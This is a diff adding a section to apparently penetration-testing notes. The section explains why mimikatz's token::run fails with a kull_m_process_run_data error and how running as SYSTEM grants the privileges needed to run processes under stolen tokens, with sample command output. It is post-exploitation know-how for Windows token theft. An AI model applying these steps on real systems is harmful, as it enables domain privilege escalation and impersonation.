@@ -117,3 +117,48 @@ Local Group Memberships
 Global Group memberships     *Domain Admins        *Domain Users
 The command completed successfully.
 ```
+
+## Demystifying the `kull_m_process_run_data` Error
+
+Even as a local administrator, you can get the `kull_m_process_run_data` error:
+
+```
+mimikatz # token::run /id:1075487 /process:whoami.exe
+Token Id  : 1075487
+User name :
+SID name  :
+
+7156    {0;000f0ac5} 3 F 1075487        child\ffast     S-1-5-21-1345929560-157546789-2569868433-1123   (15g,24p)       Primary
+ERROR kull_m_process_run_data ; CreateProcessAsUser (0x00000522)
+```
+
+- The error message says that the `CreateProcessAsUser` function could not be executed.
+
+The `token::run` command uses the function `CreateProceasAsUser` to create a
+new process in the security context of the specified token and requires the
+following privileges (source: [CreateProcessAsUserA function (processthreadsapi.h)](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera)):
+
+- `SeIncreaseQuotaPrivilege` privilege
+- `SeAssignPrimaryTokenPrivilege` privilege (if the token is not assignable)
+
+A local admin has the permission to get the `SeIncreaseQuotaPrivilege` privilege but not the `SeAssignPrimaryTokenPrivilege` privilege:
+
+```
+mimikatz # privilege::name SeIncreaseQuotaPrivilege
+Privilege '5' OK
+
+mimikatz # privilege::name SeAssignPrimaryTokenPrivilege
+ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (3) c0000061
+```
+
+If you start mimikatz as `SYSTEM`, these privileges can be acquired:
+
+```
+mimikatz # privilege::name SeIncreaseQuotaPrivilege
+Privilege '5' OK
+
+mimikatz # privilege::name SeAssignPrimaryTokenPrivilege
+Privilege '3' OK
+```
+
+Then, it's possible to use the `token::run` command and use stolen tokens as primary tokens.
